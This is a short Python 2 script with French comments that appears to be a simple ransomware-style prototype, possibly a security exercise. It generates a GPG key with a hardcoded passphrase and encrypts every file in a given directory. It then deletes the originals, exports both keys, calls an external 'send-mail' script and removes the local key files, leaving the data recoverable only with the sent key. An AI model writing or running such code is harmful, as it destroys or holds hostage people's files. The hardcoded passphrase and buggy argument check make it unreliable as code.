import os
import sys
import subprocess
import gnupg

cwd = os.getcwd()
gpg = gnupg.GPG(gnupghome=cwd)

def clean():
    li = ['pubring.gpg', 'pubring.gpg~', 'random_seed', 'secring.gpg', 'trustdb.gpg', 'key.asc']
    global cwd
    for l in li:
        string = cwd + "/" + l
        os.remove(string)

def gen_gpg():
    input_data = gpg.gen_key_input(key_type="RSA", key_length=4096, name_email="dusartc@Debian", passphrase="quelestvotresecretpourunebonnepuree")
    print "gen key"
    key = gpg.gen_key(input_data)
    print "gen key done"
    export()

def encrypt(directory):
    target_dir = cwd + "/" + directory
    print "will encrypt: ", target_dir
    os.chdir(target_dir)
    for files in os.listdir(os.getcwd()):
        if os.path.isfile(files):
            print files
            with open(files,"rb") as f:
                data = gpg.encrypt_file(f, recipients=["dusartc@Debian"], output=files+".gpg")
                print "ok: ", data.ok
                print "status: ", data.status
                print "stderr: ", data.stderr
            os.remove(files)
            print files + " removed"
    os.chdir(cwd)

def decrypt(directory):
    target_dir = cwd + "/" + directory
    print "will decrypt: ", target_dir
    os.chdir(target_dir)
    for files in os.listdir(os.getcwd()):
        if os.path.isfile(files):
            if files.endswith('.gpg'):
                print files
                with open(files, "rb") as f:
                    data = gpg.decrypt_file(f, passphrase='quelestvotresecretpourunebonnepuree', output=''.join(os.path.splitext(files)[:-1]))
                    print "ok: ", data.ok
                    print "status: ", data.status
                    print "stderr: ", data.stderr
    os.chdir(cwd)

def export():
    print "export key"
    pub = gpg.export_keys("dusartc@Debian")
    priv = gpg.export_keys("dusartc@Debian", True)
    with open('key.asc', 'w') as f:
        f.write(pub)
        f.write(priv)

def importe_cles(k):
    key = open(k).read()
    result = gpg.import_keys(key)

def main():
    ###
    # utilisation :
    #   - chiffrement : 
    #     python secu.py directory
    #   - dechiffrement :
    #     python secu.py key.asc directory
    # attention : le chiffrement supprime les fichiers qui seront chiffres
    ###
    if 2 < len(sys.argv) > 3:
        sys.exit(0)
    if len(sys.argv) == 2:
        gen_gpg()
        encrypt(sys.argv[1])
        subprocess.call("./send-mail")
        clean()
    elif sys.argv[1].endswith('.asc'):
        importe_cles(sys.argv[1])
        decrypt(sys.argv[2])
        clean()
    else :
        print "cle manquante : key.asc"
        sys.exit(0)


if __name__ == '__main__':
    main()
